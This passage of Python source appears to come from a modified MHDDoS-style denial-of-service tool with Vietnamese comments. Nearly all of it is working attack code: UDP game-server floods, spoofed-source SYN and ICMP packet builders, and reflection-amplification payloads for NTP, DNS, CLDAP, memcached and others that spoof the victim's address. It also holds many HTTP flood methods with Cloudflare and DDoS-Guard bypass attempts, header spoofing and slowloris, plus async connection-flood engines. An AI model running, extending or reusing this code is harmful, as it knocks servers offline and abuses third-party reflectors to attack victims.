        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            s.settimeout(.9)
            while self._synevent.is_set() and Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def FIVEMTOKEN(self) -> None:
        token = str(uuid4())
        steamid_min = 76561197960265728
        steamid_max = 76561199999999999
        guid = str(randint(steamid_min, steamid_max))

        payload = b"\xff\xff\xff\xff" + f"getinfo token={token}&guid={guid}".encode()

        s = None
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            s.settimeout(.9)
            while self._synevent.is_set() and Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def FIVEM(self) -> None:
        payload = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            s.settimeout(.9)
            while self._synevent.is_set() and Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def TS3(self) -> None:
        payload = b'\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02'
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            s.settimeout(.9)
            while self._synevent.is_set() and Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def MCPE(self) -> None:
        payload = (b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f'
                   b'\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20'
                   b'\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c'
                   b'\x73')
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            s.settimeout(.9)
            while self._synevent.is_set() and Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def _genrate_syn(self) -> bytes:
        ip: IP = IP()
        ip.set_ip_src(__ip__)
        ip.set_ip_dst(self._target[0])
        tcp: TCP = TCP()
        tcp.set_SYN()
        tcp.set_th_flags(0x02)
        tcp.set_th_dport(self._target[1])
        tcp.set_th_sport(ProxyTools.Random.rand_int(32768, 65535))
        ip.contains(tcp)
        return ip.get_packet()

    def _genrate_icmp(self) -> bytes:
        ip: IP = IP()
        ip.set_ip_src(__ip__)
        ip.set_ip_dst(self._target[0])
        icmp: ICMP = ICMP()
        icmp.set_icmp_type(icmp.ICMP_ECHO)
        icmp.contains(Data(b"A" * ProxyTools.Random.rand_int(16, 1024)))
        ip.contains(icmp)
        return ip.get_packet()

    def _generate_amp(self):
        payloads = []
        for ref in self._ref:
            ip: IP = IP()
            ip.set_ip_src(self._target[0])
            ip.set_ip_dst(ref)

            ud: UDP = UDP()
            ud.set_uh_dport(self._amp_payload[1])
            ud.set_uh_sport(self._target[1])

            ud.contains(Data(self._amp_payload[0]))
            ip.contains(ud)

            payloads.append((ip.get_packet(), (ref, self._amp_payload[1])))
        return payloads

    def select(self, name):
        self.SENT_FLOOD = self.TCP

        if name in self.methods:
            self.SENT_FLOOD = self.methods[name]
            return

        if name == "ICMP":
            self.SENT_FLOOD = self.ICMP
            self._target = (self._target[0], 0)
        elif name == "RDP":
            self._amp_payload = (
                b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00',
                3389)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        elif name == "CLDAP":
            self._amp_payload = (
                b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00'
                b'\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00',
                389)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        elif name == "MEM":
            self._amp_payload = (
                b'\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n', 11211)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        elif name == "CHAR":
            self._amp_payload = (b'\x01', 19)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        elif name == "ARD":
            self._amp_payload = (b'\x00\x14\x00\x00', 3283)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        elif name == "NTP":
            self._amp_payload = (b'\x17\x00\x03\x2a\x00\x00\x00\x00', 123)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        elif name == "DNS":
            self._amp_payload = (
                b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00'
                b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00',
                53)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())


# noinspection PyBroadException,PyUnusedLocal
class HttpFlood(Thread):
    _proxies: List[Proxy] = None
    _payload: str
    _defaultpayload: Any
    _req_type: str
    _useragents: List[str]
    _referers: List[str]
    _target: URL
    _method: str
    _rpc: int
    _synevent: Any
    SENT_FLOOD: Any

    def __init__(self,
                 thread_id: int,
                 target: URL,
                 host: str,
                 method: str = "GET",
                 rpc: int = 1,
                 synevent: Event = None,
                 useragents: Set[str] = None,
                 referers: Set[str] = None,
                 proxies: Set[Proxy] = None) -> None:
        Thread.__init__(self, daemon=True)
        self.SENT_FLOOD = None
        self._thread_id = thread_id
        self._synevent = synevent
        self._rpc = rpc
        self._method = method
        self._target = target
        self._host = host
        self._raw_target = (self._host, (self._target.port or 80))

        self.methods = {
            "POST": self.POST,
            "CFB": self.CFB,
            "CFBUAM": self.CFBUAM,
            "XMLRPC": self.XMLRPC,
            "BOT": self.BOT,
            "APACHE": self.APACHE,
            "BYPASS": self.BYPASS,
            "DGB": self.DGB,
            "OVH": self.OVH,
            "AVB": self.AVB,
            "STRESS": self.STRESS,
            "DYN": self.DYN,
            "SLOW": self.SLOW,
            "GSB": self.GSB,
            "RHEX": self.RHEX,
            "STOMP": self.STOMP,
            "NULL": self.NULL,
            "COOKIE": self.COOKIES,
            "TOR": self.TOR,
            "EVEN": self.EVEN,
            "DOWNLOADER": self.DOWNLOADER,
            "BOMB": self.BOMB,
            "PPS": self.PPS,
            "KILLER": self.KILLER,
        }

        if not referers:
            referers: List[str] = list(DEFAULT_REFERERS)
        self._referers = list(referers)
        if proxies:
            self._proxies = list(proxies)

        if not useragents:
            useragents: List[str] = list(DEFAULT_USERAGENTS)
        self._useragents = list(useragents)
        self._req_type = self.getMethodType(method)
        self._defaultpayload = "%s %s HTTP/%s\r\n" % (self._req_type,
                                                     target.raw_path_qs,
                                                     randchoice(['1.0', '1.1']))
        self._payload = (self._defaultpayload +
                         'Accept-Encoding: gzip, deflate, br\r\n'
                         'Accept-Language: en-US,en;q=0.9\r\n'
                         'Cache-Control: max-age=0\r\n'
                         'Connection: keep-alive\r\n'
                         'Sec-Fetch-Dest: document\r\n'
                         'Sec-Fetch-Mode: navigate\r\n'
                         'Sec-Fetch-Site: none\r\n'
                         'Sec-Fetch-User: ?1\r\n'
                         'Sec-Gpc: 1\r\n'
                         'Pragma: no-cache\r\n'
                         'Upgrade-Insecure-Requests: 1\r\n')

    def select(self, name: str) -> None:
        self.SENT_FLOOD = self.GET
        if name in self.methods:
            self.SENT_FLOOD = self.methods[name]

    def run(self) -> None:
        if self._synevent is None:
            self._synevent = Event()
            self._synevent.set()
        self._synevent.wait()
        self.select(self._method)
        while self._synevent.is_set():
            self.SENT_FLOOD()

    @property
    def SpoofIP(self) -> str:
        spoof: str = ProxyTools.Random.rand_ipv4()
        return ("X-Forwarded-Proto: Http\r\n"
                f"X-Forwarded-Host: {self._target.raw_host}, 1.1.1.1\r\n"
                f"Via: {spoof}\r\n"
                f"Client-IP: {spoof}\r\n"
                f'X-Forwarded-For: {spoof}\r\n'
                f'Real-IP: {spoof}\r\n')

    def generate_payload(self, other: str = None) -> bytes:
        return str.encode((self._payload +
                           f"Host: {self._target.authority}\r\n" +
                           self.randHeadercontent +
                           (other if other else "") +
                           "\r\n"))

    def open_connection(self, host=None) -> socket:
        global CONNECTIONS_SENT           # [B18]
        if self._proxies:
            sock = randchoice(self._proxies).open_socket(AF_INET, SOCK_STREAM)
        else:
            sock = socket(AF_INET, SOCK_STREAM)

        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        sock.settimeout(.9)
        sock.connect(host or self._raw_target)

        if self._target.scheme.lower() == "https":
            sock = ctx.wrap_socket(sock,
                                   server_hostname=host[0] if host else self._target.host,
                                   server_side=False,
                                   do_handshake_on_connect=True,
                                   suppress_ragged_eofs=True)
        CONNECTIONS_SENT += 1
        return sock

    @property
    def randHeadercontent(self) -> str:
        return (f"User-Agent: {randchoice(self._useragents)}\r\n"
                f"Referer: {randchoice(self._referers)}{parse.quote(self._target.human_repr())}\r\n" +
                self.SpoofIP)

    @staticmethod
    def getMethodType(method: str) -> str:
        m = method.upper()
        if m in {"POST", "XMLRPC", "STRESS"}:
            return "POST"
        if m in {"GSB", "HEAD"}:
            return "HEAD"
        return "GET"

    def POST(self) -> None:
        body = '{"data": %s}' % ProxyTools.Random.rand_str(32)
        payload: bytes = self.generate_payload(
            ("Content-Length: %d\r\n"
             "X-Requested-With: XMLHttpRequest\r\n"
             "Content-Type: application/json\r\n\r\n"
             "%s") % (len(body), body))[:-2]
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def TOR(self) -> None:
        provider = "." + randchoice(tor2webs)
        target = self._target.authority.replace(".onion", provider)
        payload: Any = str.encode(self._payload +
                                  f"Host: {target}\r\n" +
                                  self.randHeadercontent +
                                  "\r\n")
        s = None
        target = self._target.host.replace(".onion", provider), self._raw_target[1]
        with suppress(Exception), self.open_connection(target) as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def STRESS(self) -> None:
        body = '{"data": %s}' % ProxyTools.Random.rand_str(512)
        payload: bytes = self.generate_payload(
            ("Content-Length: %d\r\n"
             "X-Requested-With: XMLHttpRequest\r\n"
             "Content-Type: application/json\r\n\r\n"
             "%s") % (len(body), body))[:-2]
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def COOKIES(self) -> None:
        payload: bytes = self.generate_payload(
            "Cookie: _ga=GA%s;"
            " _gat=1;"
            " __cfduid=dc232334gwdsd23434542342342342475611928;"
            " %s=%s\r\n" %
            (ProxyTools.Random.rand_int(1000, 99999), ProxyTools.Random.rand_str(6),
             ProxyTools.Random.rand_str(32)))
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def APACHE(self) -> None:
        payload: bytes = self.generate_payload(
            "Range: bytes=0-,%s" % ",".join("5-%d" % i
                                            for i in range(1, 1024)))
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def XMLRPC(self) -> None:
        body = ("<?xml version='1.0' encoding='iso-8859-1'?>"
                "<methodCall><methodName>pingback.ping</methodName>"
                "<params><param><value><string>%s</string></value>"
                "</param><param><value><string>%s</string>"
                "</value></param></params></methodCall>") % (
            ProxyTools.Random.rand_str(64),
            ProxyTools.Random.rand_str(64))
        payload: bytes = self.generate_payload(
            ("Content-Length: %d\r\n"
             "X-Requested-With: XMLHttpRequest\r\n"
             "Content-Type: application/xml\r\n\r\n"
             "%s") % (len(body), body))[:-2]
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def PPS(self) -> None:
        payload: Any = str.encode(self._defaultpayload +
                                  f"Host: {self._target.authority}\r\n\r\n")
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def KILLER(self) -> None:
        while self._synevent.is_set():
            if active_count() > 4096:
                sleep(.01)
                break
            Thread(target=self.GET, daemon=True).start()

    def GET(self) -> None:
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def BOT(self) -> None:
        payload: bytes = self.generate_payload()
        p1, p2 = str.encode(
            "GET /robots.txt HTTP/1.1\r\n"
            "Host: %s\r\n" % self._target.raw_authority +
            "Connection: Keep-Alive\r\n"
            "Accept: text/plain,text/html,*/*\r\n"
            "User-Agent: %s\r\n" % randchoice(search_engine_agents) +
            "Accept-Encoding: gzip,deflate,br\r\n\r\n"), str.encode(
            "GET /sitemap.xml HTTP/1.1\r\n"
            "Host: %s\r\n" % self._target.raw_authority +
            "Connection: Keep-Alive\r\n"
            "Accept: */*\r\n"
            "From: googlebot(at)googlebot.com\r\n"
            "User-Agent: %s\r\n" % randchoice(search_engine_agents) +
            "Accept-Encoding: gzip,deflate,br\r\n"
            "If-None-Match: %s-%s\r\n" % (ProxyTools.Random.rand_str(9),
                                          ProxyTools.Random.rand_str(4)) +
            "If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n")
        s = None
        with suppress(Exception), self.open_connection() as s:
            Tools.send(s, p1)
            Tools.send(s, p2)
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def EVEN(self) -> None:
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            while self._synevent.is_set() and Tools.send(s, payload) and s.recv(1):
                continue
        Tools.safe_close(s)

    def OVH(self) -> None:
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(min(self._rpc, 5)):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def CFB(self):
        global REQUESTS_SENT, BYTES_SEND
        pro = None
        if self._proxies:
            pro = randchoice(self._proxies)
        s = None
        with suppress(Exception), create_scraper() as s:
            for _ in range(self._rpc):
                if pro:
                    with s.get(self._target.human_repr(),
                               proxies=pro.asRequest()) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)
                        continue

                with s.get(self._target.human_repr()) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += Tools.sizeOfRequest(res)
        Tools.safe_close(s)

    def CFBUAM(self):
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            Tools.send(s, payload)
            sleep(5.01)
            ts = time()
            for _ in range(self._rpc):
                Tools.send(s, payload)
                if time() > ts + 120:
                    break
        Tools.safe_close(s)

    def AVB(self):
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                sleep(max(self._rpc / 1000, 1))
                Tools.send(s, payload)
        Tools.safe_close(s)

    def DGB(self):
        global REQUESTS_SENT, BYTES_SEND
        with suppress(Exception):
            if self._proxies:
                pro = randchoice(self._proxies)
                with Tools.dgb_solver(self._target.human_repr(),
                                      randchoice(self._useragents),
                                      pro.asRequest()) as ss:
                    for _ in range(min(self._rpc, 5)):
                        sleep(min(self._rpc, 5) / 100)
                        with ss.get(self._target.human_repr(),
                                    proxies=pro.asRequest()) as res:
                            REQUESTS_SENT += 1
                            BYTES_SEND += Tools.sizeOfRequest(res)
                return

            with Tools.dgb_solver(self._target.human_repr(),
                                  randchoice(self._useragents)) as ss:
                for _ in range(min(self._rpc, 5)):
                    sleep(min(self._rpc, 5) / 100)
                    with ss.get(self._target.human_repr()) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)

    def DYN(self):
        payload: Any = str.encode(self._payload +
                                  f"Host: {ProxyTools.Random.rand_str(6)}.{self._target.authority}\r\n" +
                                  self.randHeadercontent +
                                  "\r\n")
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def DOWNLOADER(self):
        payload: Any = self.generate_payload()

        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                if not self._synevent.is_set():
                    break
                Tools.send(s, payload)
                while True:
                    sleep(.01)
                    data = s.recv(1)
                    if not data or not self._synevent.is_set():
                        break
            Tools.send(s, b'0')
        Tools.safe_close(s)

    def BYPASS(self):
        global REQUESTS_SENT, BYTES_SEND
        pro = None
        if self._proxies:
            pro = randchoice(self._proxies)
        s = None
        with suppress(Exception), Session() as s:
            for _ in range(self._rpc):
                if pro:
                    with s.get(self._target.human_repr(),
                               proxies=pro.asRequest()) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)
                        continue

                with s.get(self._target.human_repr()) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += Tools.sizeOfRequest(res)
        Tools.safe_close(s)

    def GSB(self):
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                payload = str.encode("%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
                                                                  self._target.raw_path_qs,
                                                                  ProxyTools.Random.rand_str(6)) +
                                     "Host: %s\r\n" % self._target.authority +
                                     self.randHeadercontent +
                                     'Accept-Encoding: gzip, deflate, br\r\n'
                                     'Accept-Language: en-US,en;q=0.9\r\n'
                                     'Cache-Control: max-age=0\r\n'
                                     'Connection: Keep-Alive\r\n'
                                     'Sec-Fetch-Dest: document\r\n'
                                     'Sec-Fetch-Mode: navigate\r\n'
                                     'Sec-Fetch-Site: none\r\n'
                                     'Sec-Fetch-User: ?1\r\n'
                                     'Sec-Gpc: 1\r\n'
                                     'Pragma: no-cache\r\n'
                                     'Upgrade-Insecure-Requests: 1\r\n\r\n')
                Tools.send(s, payload)
        Tools.safe_close(s)

    def RHEX(self):
        randhex = randbytes(randchoice([32, 64, 128])).hex()
        payload = str.encode("%s %s/%s HTTP/1.1\r\n" % (self._req_type,
                                                        self._target.authority,
                                                        randhex) +
                             "Host: %s/%s\r\n" % (self._target.authority, randhex) +
                             self.randHeadercontent +
                             'Accept-Encoding: gzip, deflate, br\r\n'
                             'Accept-Language: en-US,en;q=0.9\r\n'
                             'Cache-Control: max-age=0\r\n'
                             'Connection: keep-alive\r\n'
                             'Sec-Fetch-Dest: document\r\n'
                             'Sec-Fetch-Mode: navigate\r\n'
                             'Sec-Fetch-Site: none\r\n'
                             'Sec-Fetch-User: ?1\r\n'
                             'Sec-Gpc: 1\r\n'
                             'Pragma: no-cache\r\n'
                             'Upgrade-Insecure-Requests: 1\r\n\r\n')
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def STOMP(self):
        dep = ('Accept-Encoding: gzip, deflate, br\r\n'
               'Accept-Language: en-US,en;q=0.9\r\n'
               'Cache-Control: max-age=0\r\n'
               'Connection: keep-alive\r\n'
               'Sec-Fetch-Dest: document\r\n'
               'Sec-Fetch-Mode: navigate\r\n'
               'Sec-Fetch-Site: none\r\n'
               'Sec-Fetch-User: ?1\r\n'
               'Sec-Gpc: 1\r\n'
               'Pragma: no-cache\r\n'
               'Upgrade-Insecure-Requests: 1\r\n\r\n')
        hexh = r'\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87' \
               r'\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F' \
               r'\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F' \
               r'\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84' \
               r'\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F' \
               r'\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98' \
               r'\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98' \
               r'\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B' \
               r'\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99' \
               r'\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C' \
               r'\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA '
        p1, p2 = str.encode("%s %s/%s HTTP/1.1\r\n" % (self._req_type,
                                                       self._target.authority,
                                                       hexh) +
                            "Host: %s/%s\r\n" % (self._target.authority, hexh) +
                            self.randHeadercontent + dep), str.encode(
            "%s %s/cdn-cgi/l/chk_captcha HTTP/1.1\r\n" % (self._req_type,
                                                          self._target.authority) +
            "Host: %s\r\n" % hexh +
            self.randHeadercontent + dep)
        s = None
        with suppress(Exception), self.open_connection() as s:
            Tools.send(s, p1)
            for _ in range(self._rpc):
                Tools.send(s, p2)
        Tools.safe_close(s)

    def NULL(self) -> None:
        payload: Any = str.encode(self._payload +
                                  f"Host: {self._target.authority}\r\n" +
                                  "User-Agent: null\r\n" +
                                  "Referrer: null\r\n" +
                                  self.SpoofIP + "\r\n")
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def BOMB(self):
        if not self._proxies:
            return

        while True:
            proxy = randchoice(self._proxies)
            if proxy.type != ProxyType.SOCKS4:
                break

        res = run(
            [
                f'{bombardier_path}',
                f'--connections={self._rpc}',
                '--http2',
                '--method=GET',
                '--latencies',
                '--timeout=30s',
                f'--requests={self._rpc}',
                f'--proxy={proxy}',
                f'{self._target.human_repr()}',
            ],
            stdout=PIPE,
        )
        if self._thread_id == 0:
            print(proxy, res.stdout.decode(), sep='\n')

    def SLOW(self):
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
            while self._synevent.is_set() and Tools.send(s, payload) and s.recv(1):
                for _ in range(self._rpc):
                    keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
                    Tools.send(s, keep)
                    sleep(max(self._rpc / 15, 0.01))
        Tools.safe_close(s)


# =====================================================================
#  [B17][B18] ASYNC ENGINE
# =====================================================================

async def _async_open_connection(host: str, port: int, use_ssl: bool,
                                 server_hostname: str = None, proxy=None):
    """Mở 1 kết nối TCP/TLS bất đồng bộ.

    - proxy=None           -> kết nối thẳng
    - proxy HTTP + HTTPS   -> CONNECT rồi start_tls trên chính socket đó
    - proxy HTTP + HTTP    -> trả socket thô (caller tự dùng absolute-URI)
    - proxy SOCKS4/5       -> chưa hỗ trợ handshake async (báo OSError)
    """
    kwargs = {"ssl": ctx} if use_ssl else {}
    if use_ssl:
        kwargs["server_hostname"] = server_hostname

    if proxy is None:
        return await asyncio.open_connection(host, port, **kwargs)

    if proxy.type in (ProxyType.SOCKS4, ProxyType.SOCKS5):
        raise OSError("async chưa hỗ trợ SOCKS handshake, hãy dùng proxy HTTP")

    r, w = await asyncio.open_connection(proxy.host, proxy.port)
    try:
        if use_ssl:
            w.write(f"CONNECT {host}:{port} HTTP/1.1\r\n"
                    f"Host: {host}:{port}\r\n\r\n".encode())
            await w.drain()
            head = await asyncio.wait_for(r.readuntil(b"\r\n\r\n"), timeout=10)
            if b" 200 " not in head.split(b"\r\n", 1)[0]:
                raise OSError("proxy CONNECT thất bại")
            await w.start_tls(ctx, server_hostname=server_hostname)
        return r, w
    except Exception:
        with suppress(Exception):
            w.close()
        raise


class AsyncHttpFlood(Thread):
    """[B16] Bản asyncio giữ kết nối keep-alive.

    1 thread chứa 1 event loop, `workers` coroutine (CLI: threads), mỗi
    coroutine giữ 1 kết nối và gửi `rpc` request trước khi mở lại.
    """

    _proxies: List[Proxy] = None
    POLL = 0.05

    def __init__(self,
                 target: URL,
                 workers: int = 100,
                 rpc: int = 100,
                 synevent: Event = None,
                 useragents: Set[str] = None,
                 referers: Set[str] = None,
                 proxies: Set[Proxy] = None) -> None:
        Thread.__init__(self, daemon=True)
        self._target = target
        self._workers = max(1, workers)
        self._rpc = max(1, rpc)
        self._synevent = synevent
        self._useragents = list(useragents) if useragents else list(DEFAULT_USERAGENTS)
        self._referers = list(referers) if referers else list(DEFAULT_REFERERS)
        self._proxies = list(proxies) if proxies else None
        self._payload_cache: List[bytes] = []

        self._scheme = (target.scheme or "http").lower()
        self._ssl = self._scheme == "https"
        self._port = target.port or (443 if self._ssl else 80)
        self._host = target.raw_host
        self._path = target.raw_path_qs or "/"

        for _ in range(8):
            self._payload_cache.append(self._build_payload())

    def _build_payload(self) -> bytes:
        return (
            f"GET {self._path} HTTP/1.1\r\n"
            f"Host: {self._target.raw_authority}\r\n"
            f"User-Agent: {randchoice(self._useragents)}\r\n"
            f"Referer: {randchoice(self._referers)}\r\n"
            "Accept: */*\r\n"
            "Accept-Encoding: gzip, deflate, br\r\n"
            "Accept-Language: en-US,en;q=0.9\r\n"
            "Connection: keep-alive\r\n"
            "\r\n"
        ).encode()

    # ---------------- asyncio core ----------------
    async def _open(self, proxy=None):
        """[B17] Nhận `proxy` từ caller (trước đây signature thiếu -> TypeError)."""
        if proxy is None and self._proxies:
            proxy = randchoice(self._proxies)
        return await _async_open_connection(self._host, self._port, self._ssl,
                                            self._target.raw_host, proxy)

    async def _flooder(self) -> None:
        global REQUESTS_SENT, BYTES_SEND     # [B19] thiếu global -> UnboundLocalError bị nuốt, PPS/BPS = 0
        while self._synevent.is_set():
            proxy = randchoice(self._proxies) if self._proxies else None
            try:
                r, w = await asyncio.wait_for(self._open(proxy), timeout=10)
            except (asyncio.TimeoutError, OSError, Exception):
                await asyncio.sleep(self.POLL)
                continue
            try:
                absolute = proxy is not None and not self._ssl
                for _ in range(self._rpc):
                    if not self._synevent.is_set():
                        break
                    payload = self._payload_cache[randint(0, len(self._payload_cache) - 1)]
                    if absolute:
                        payload = payload.replace(
                            f"GET {self._path} HTTP/1.1".encode(),
                            f"GET {self._target.human_repr()} HTTP/1.1".encode(), 1)
                    w.write(payload)
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(payload)
                    await w.drain()
            except Exception:
                pass
            finally:
                with suppress(Exception):
                    w.close()
                    await asyncio.wait_for(w.wait_closed(), timeout=2)

    async def _runner(self) -> None:
        if not self._synevent.is_set():
            await asyncio.get_running_loop().run_in_executor(None, self._synevent.wait)
        tasks = [asyncio.create_task(self._flooder()) for _ in range(self._workers)]
        try:
            while self._synevent.is_set():
                await asyncio.sleep(0.5)
        finally:
            for t in tasks:
                t.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)

    def run(self) -> None:
        if self._synevent is None:
            self._synevent = Event()
            self._synevent.set()
        try:
            asyncio.run(self._runner())
        except (KeyboardInterrupt, SystemExit):
            pass
        except Exception as e:                            # pragma: no cover
            logger.debug(f"[AIOHTTP] stopped: {e.__repr__()}")


class AsyncCpsFlood(Thread):
    """[B18] Tích hợp NGUYÊN logic đoạn script asyncio rời:

        async def flooder(target, payload, event, rpc=100):
            await event.wait()
            while event.is_set():
                r, w = await open_connection(target.host, target.port or 80, ...)
                for _ in range(rpc):
                    w.write(payload); await w.drain(); pps += 1

    Khác AsyncHttpFlood (giữ 1 kết nối, gửi rpc request):
    bản này MỞ KẾT NỐI MỚI mỗi vòng lặp -> đẩy CPS (connection/giây) lên cao,
    phù hợp test connection-rate. `workers` = số task coroutine,
    `rpc` = số request gửi trên mỗi kết nối trước khi đóng.

    CLI tương ứng script gốc:
        python3 start.py ASYNCIO <url> 0 <workers> none.txt <rpc> <timer>
    """

    POLL = 0.01

    def __init__(self,
                 target: URL,
                 workers: int = 100,
                 rpc: int = 100,
                 synevent: Event = None,
                 proxies: Set[Proxy] = None) -> None:
        Thread.__init__(self, daemon=True)
        self._target = target
        self._workers = max(1, workers)
        self._rpc = max(1, rpc)
        self._synevent = synevent
        self._proxies = list(proxies) if proxies else None

        self._ssl = (target.scheme or "http").lower() == "https"
        self._port = target.port or (443 if self._ssl else 80)
        self._host = target.raw_host

        # payload giống hệt script gốc
        self._payload = (
            f"GET {target.raw_path_qs} HTTP/1.1\r\n"
            f"Host: {target.raw_authority}\r\n"
            "Connection: keep-alive\r\n"
            "\r\n").encode()
        # biến thể absolute-URI cho proxy HTTP + HTTP thường
        self._payload_abs = self._payload.replace(
            f"GET {target.raw_path_qs} HTTP/1.1".encode(),
            f"GET {target.human_repr()} HTTP/1.1".encode(), 1)

    async def flooder(self) -> None:
        """Tương đương hàm flooder() trong script gốc."""
        global REQUESTS_SENT, BYTES_SEND, CONNECTIONS_SENT   # [B19] thiếu global -> UnboundLocalError bị nuốt, không gửi được request nào
        while not self._synevent.is_set():          # ~ await event.wait()
